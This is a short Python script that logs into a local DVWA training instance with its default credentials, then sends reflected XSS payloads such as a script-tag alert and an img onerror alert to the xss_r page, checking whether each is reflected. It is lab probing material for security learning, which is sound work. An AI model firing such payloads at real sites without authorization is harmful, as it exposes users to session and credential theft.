import requests

# Login  to DVWA
session = requests.Session()
session.post('http://localhost/dvwa/login.php', data={
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
})
phpsessid = session.cookies.get('PHPSESSID')

print('Testing DVWA XSS payload reflection...')
print(f'PHPSESSID: {phpsessid}')
print()

# Test different payloads
payloads = [
    '<xsstest123>',
    '"><script>alert("xss")</script>',
    '<img src=x onerror="alert(1)">',
    'xssmarker12345',
]

for payload in payloads:
    url = f'http://localhost/dvwa/vulnerabilities/xss_r/?name={payload}'
    resp = session.get(url)
    
    print(f'Payload: {payload}')
    print(f'  Reflected: {payload in resp.text}')
    
    if payload in resp.text:
        idx = resp.text.find(payload)
        start = max(0, idx - 80)
        end = min(len(resp.text), idx + 150)
        snippet = resp.text[start:end]
        print(f'  Context: ...{snippet}...')
    print()

# Also test the page without authentication
print('\nTesting WITHOUT authentication:')
session_noauth = requests.Session()
payload = '<xsstest123>'
url = f'http://localhost/dvwa/vulnerabilities/xss_r/?name={payload}'
resp = session_noauth.get(url)
print(f'Response contains payload: {payload in resp.text}')
print(f'Response contains login page: {"Login" in resp.text}')
